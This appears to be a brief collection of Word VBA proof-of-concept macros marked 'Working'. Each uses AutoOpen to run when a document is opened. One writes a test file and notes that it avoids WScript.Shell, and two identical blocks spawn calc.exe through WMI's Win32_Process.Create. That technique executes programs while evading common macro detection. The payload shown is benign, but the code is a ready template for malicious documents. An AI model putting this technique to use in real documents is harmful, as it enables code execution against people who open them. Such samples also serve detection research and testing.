Working
Sub AutoOpen()
    Open "C:\Users\Public\macro_test_result.txt" For Output As #1
    Print #1, "Word macro ran successfully without using WScript.Shell"
    Close #1
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub
